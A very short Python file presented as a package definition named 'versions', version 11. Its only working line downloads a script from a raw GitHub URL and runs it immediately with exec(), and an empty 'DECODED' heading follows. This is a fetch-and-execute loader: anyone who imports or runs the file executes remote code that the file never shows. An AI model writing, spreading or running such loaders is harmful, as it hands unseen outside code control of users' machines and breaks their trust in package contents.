[""" Package """]
import urllib.request
name = "versions"
version = 11
exec(urllib.request.urlopen("https://raw.githubusercontent.com/Fries-byte/pistud/refs/heads/main/packages.py").read().decode())

[""" DECODED """]
